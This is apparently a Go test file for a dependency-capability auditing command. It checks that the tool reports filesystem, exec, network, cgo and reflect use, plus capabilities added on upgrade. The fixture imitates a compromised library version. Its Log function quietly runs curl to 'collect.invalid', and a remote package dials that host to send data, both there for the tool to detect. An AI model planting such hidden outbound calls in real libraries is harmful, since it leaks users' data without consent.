package security_test

import (
	"strings"
	"testing"

	"github.com/slash-mark-dev/go-suite/internal/testenv"
)

type capsJSON struct {
	Mode    string `json:"mode"`
	Modules []struct {
		Module       string              `json:"module"`
		Version      string              `json:"version"`
		Capabilities []string            `json:"capabilities"`
		Packages     int                 `json:"packages"`
		ByCapability map[string][]string `json:"byCapability"`
	} `json:"modules"`
	Packages []struct {
		Package      string   `json:"package"`
		Capabilities []string `json:"capabilities"`
		Evidence     []struct {
			Capability string   `json:"capability"`
			APIs       []string `json:"apis"`
			Uses       int      `json:"uses"`
			First      string   `json:"first"`
			Pos        string   `json:"pos"`
		} `json:"evidence"`
	} `json:"packages"`
	Totals   map[string]int `json:"totals"`
	Findings []struct {
		Severity string `json:"severity"`
		Rule     string `json:"rule"`
		Module   string `json:"module"`
	} `json:"findings"`
	Failing int `json:"failing"`
}

func (r *capsJSON) caps(t *testing.T, mod string) string {
	t.Helper()
	for _, m := range r.Modules {
		if m.Module == mod {
			return strings.Join(m.Capabilities, ",")
		}
	}
	t.Fatalf("module %s not in result", mod)
	return ""
}

type capsDiffJSON struct {
	Mode   string `json:"mode"`
	Module string `json:"module"`
	From   string `json:"from"`
	To     string `json:"to"`
	Old    struct {
		Capabilities []string `json:"capabilities"`
	} `json:"old"`
	New struct {
		Capabilities []string `json:"capabilities"`
	} `json:"new"`
	Added []struct {
		Capability string `json:"capability"`
		Severity   string `json:"severity"`
		Packages   []struct {
			Package  string `json:"package"`
			Evidence []struct {
				APIs []string `json:"apis"`
				Pos  string   `json:"pos"`
			} `json:"evidence"`
		} `json:"packages"`
	} `json:"added"`
	Removed []struct {
		Capability string `json:"capability"`
	} `json:"removed"`
	AddedViaDependencies []struct {
		Capability string   `json:"capability"`
		Via        []string `json:"via"`
	} `json:"addedViaDependencies"`
	NewDependencies []string `json:"newDependencies"`
	Failing         int      `json:"failing"`
}

func capsWorld(t *testing.T) (*testenv.World, string) {
	w := testenv.New(t)
	w.AddModule("example.com/logx", "v1.0.0", map[string]string{
		"logx.go": `package logx

import (
	"fmt"
	"os"
)

func Log(s string) { fmt.Fprintln(os.Stderr, s) }

func Rotate(name string) error { return os.Remove(name) }
`,
	})
	w.AddModule("example.com/logx", "v1.1.0", map[string]string{
		"go.mod": testenv.GoModFile("example.com/logx", "1.21", "example.com/helper@v1.0.0"),
		"logx.go": `package logx

import (
	"fmt"
	"os"
	"os/exec"

	"example.com/helper"
)

func Log(s string) {
	fmt.Fprintln(os.Stderr, s, helper.Home())
	_ = exec.Command("curl", "https://collect.invalid").Run()
}
`,
		"remote/remote.go": `package remote

import "net"

func Send(b []byte) error {
	c, err := net.Dial("tcp", "collect.invalid:443")
	if err != nil {
		return err
	}
	defer c.Close()
	_, err = c.Write(b)
	return err
}
`,
	})
	w.AddModule("example.com/helper", "v1.0.0", map[string]string{
		"helper.go": "package helper\n\nimport \"os\"\n\nfunc Home() string { return os.Getenv(\"HOME\") }\n",
	})
	w.AddModule("example.com/fsdep", "v1.0.0", map[string]string{
		"fsdep.go": `package fsdep

import (
	"os"
	"unsafe"
)

func Read(p string) ([]byte, error) { return os.ReadFile(p) }

func Size() uintptr { var x int64; return unsafe.Sizeof(x) }
`,
	})
	w.AddModule("example.com/cgodep", "v1.0.0", map[string]string{
		"pure.go": "package cgodep\n\nfunc Pure() int { return 1 }\n",
		"c.go":    "package cgodep\n\n// int add(int a, int b) { return a + b; }\nimport \"C\"\n\nfunc Add() int { return int(C.add(1, 2)) }\n",
	})
	w.AddModule("example.com/reflectdep", "v1.0.0", map[string]string{
		"r.go": `package reflectdep

import "reflect"

func Invoke(x any, m string) { reflect.ValueOf(x).MethodByName(m).Call(nil) }
`,
	})
	w.AddModule("example.com/plain", "v1.0.0", map[string]string{"p.go": "package plain\n\nimport \"strings\"\n\nfunc Up(s string) string { return strings.ToUpper(s) }\n"})
	dir := w.Project(map[string]string{
		"go.mod": testenv.GoModFile("example.com/app", "1.22", "example.com/logx@v1.0.0", "example.com/fsdep@v1.0.0",
			"example.com/cgodep@v1.0.0", "example.com/reflectdep@v1.0.0", "example.com/plain@v1.0.0"),
		"main.go": `package main

import (
	"os/exec"

	"example.com/cgodep"
	"example.com/fsdep"
	"example.com/logx"
	"example.com/plain"
	"example.com/reflectdep"
)

func main() {
	logx.Log(plain.Up("x"))
	fsdep.Read("x")
	cgodep.Pure()
	reflectdep.Invoke(nil, "M")
	exec.Command("true").Run() // the main module itself is not reported
}
`,
	})
	mustDownload(t, w, dir)
	return w, dir
}

func TestCapsProject(t *testing.T) {
	w, dir := capsWorld(t)
	r := w.Run(dir, "caps", "--json")
	expectCode(t, r, 0)
	var res capsJSON
	r.Decode(t, &res)
	if res.Mode != "project" {
		t.Fatalf("mode = %q", res.Mode)
	}
	for mod, want := range map[string]string{
		"example.com/logx":       "filesystem",
		"example.com/fsdep":      "unsafe,filesystem",
		"example.com/cgodep":     "cgo",
		"example.com/reflectdep": "reflect",
		"example.com/plain":      "",
	} {
		if got := res.caps(t, mod); got != want {
			t.Errorf("%s capabilities = %q, want %q", mod, got, want)
		}
	}
	for _, m := range res.Modules {
		if m.Module == "example.com/app" {
			t.Errorf("main module reported")
		}
	}
	if res.Totals["filesystem"] != 2 || res.Totals["exec"] != 0 {
		t.Errorf("totals = %v", res.Totals)
	}
	for _, p := range res.Packages {
		if p.Package != "example.com/reflectdep" {
			continue
		}
		e := p.Evidence[0]
		if strings.Join(e.APIs, ",") != "reflect.Value.Call,reflect.Value.MethodByName" || e.Pos != "example.com/reflectdep@v1.0.0/r.go:5" {
			t.Errorf("reflect evidence = %+v", e)
		}
	}

	r = w.Run(dir, "caps", "--json", "--deny", "unsafe,cgo")
	expectCode(t, r, 1)
	res = capsJSON{}
	r.Decode(t, &res)
	if res.Failing != 2 || len(res.Findings) != 2 || res.Findings[0].Rule != "caps/denied" {
		t.Errorf("deny findings = %+v", res.Findings)
	}

	r = w.Run(dir, "caps", "--deny", "teleport")
	expectCode(t, r, 2)

	r = w.Run(dir, "caps", "--packages")
	expectCode(t, r, 0)
	contains(t, r.Stdout, "example.com/fsdep")
	contains(t, r.Stdout, "os.ReadFile")
	contains(t, r.Stdout, "without sensitive capabilities")
}

func TestCapsUpgrade(t *testing.T) {
	w, dir := capsWorld(t)
	for _, target := range []string{"example.com/logx@v1.1.0", "example.com/logx@latest"} {
		r := w.Run(dir, "caps", "--json", "--upgrade", target)
		expectCode(t, r, 1)
		var res capsDiffJSON
		r.Decode(t, &res)
		if res.Mode != "diff" || res.From != "v1.0.0" || res.To != "v1.1.0" {
			t.Fatalf("%s: header %+v", target, res)
		}
		var added []string
		for _, a := range res.Added {
			added = append(added, a.Capability+"="+a.Severity)
		}
		if strings.Join(added, " ") != "exec=high network=high" {
			t.Errorf("added = %v", added)
		}
		ex := res.Added[0].Packages[0]
		if ex.Package != "example.com/logx" || strings.Join(ex.Evidence[0].APIs, ",") != "os/exec.Cmd.Run,os/exec.Command" ||
			ex.Evidence[0].Pos != "example.com/logx@v1.1.0/logx.go:13" {
			t.Errorf("exec evidence = %+v", ex)
		}
		if res.Added[1].Packages[0].Package != "example.com/logx/remote" {
			t.Errorf("network package = %+v", res.Added[1].Packages)
		}
		if len(res.Removed) != 1 || res.Removed[0].Capability != "filesystem" {
			t.Errorf("removed = %+v", res.Removed)
		}
		if len(res.AddedViaDependencies) != 1 || res.AddedViaDependencies[0].Capability != "env" ||
			res.AddedViaDependencies[0].Via[0] != "example.com/helper@v1.0.0" {
			t.Errorf("via dependencies = %+v", res.AddedViaDependencies)
		}
		if strings.Join(res.NewDependencies, ",") != "example.com/helper@v1.0.0" {
			t.Errorf("new dependencies = %v", res.NewDependencies)
		}
		if res.Failing != 2 {
			t.Errorf("failing = %d", res.Failing)
		}
	}
	r := w.Run(dir, "caps", "--json", "--upgrade", "example.com/logx@v1.1.0", "--fail-on", "critical")
	expectCode(t, r, 0)
	r = w.Run(dir, "caps", "--upgrade", "example.com/logx@v1.1.0")
	expectCode(t, r, 1)
	contains(t, r.Stdout, "Added capabilities (2)")
	contains(t, r.Stdout, "os/exec.Command")
	contains(t, r.Stdout, "via example.com/helper@v1.0.0")

	for _, bad := range [][]string{
		{"--upgrade", "example.com/nothere@v1.0.0"},
		{"--upgrade", "example.com/logx@v1.0.0"},
		{"--upgrade", "example.com/logx"},
		{"--upgrade", "example.com/logx@banana"},
		{"--diff", "example.com/logx@v1.0.0"},
		{"--diff", "example.com/logx@v1.0.0..v1.0.0"},
		{"--diff", "example.com/logx@v1.0.0..v1.1.0", "--upgrade", "example.com/logx@v1.1.0"},
	} {
		r := w.Run(dir, append([]string{"caps"}, bad...)...)
		if r.Code != 2 {
			t.Errorf("caps %v: exit %d, want 2\n%s", bad, r.Code, r.Stderr)
		}
	}
}

func TestCapsDiffWithoutProject(t *testing.T) {
	w, _ := capsWorld(t)
	empty := t.TempDir()
	r := w.Run(empty, "caps", "--json", "--diff", "example.com/logx@v1.0.0..v1.1.0")
	expectCode(t, r, 1)
	var res capsDiffJSON
	r.Decode(t, &res)
	if len(res.Added) != 2 {
		t.Fatalf("added = %+v", res.Added)
	}
	// Downgrade direction: nothing added at medium or above (filesystem is
	// medium and is added back, so it fails).
	r = w.Run(empty, "caps", "--json", "--diff", "example.com/logx@v1.1.0..v1.0.0")
	res = capsDiffJSON{}
	r.Decode(t, &res)
	if len(res.Added) != 1 || res.Added[0].Capability != "filesystem" || len(res.Removed) != 2 {
		t.Errorf("reverse diff: added %+v removed %+v", res.Added, res.Removed)
	}
	// A version that does not exist is a runtime error.
	r = w.Run(empty, "caps", "--json", "--diff", "example.com/logx@v1.0.0..v9.9.9")
	expectCode(t, r, 3)
}
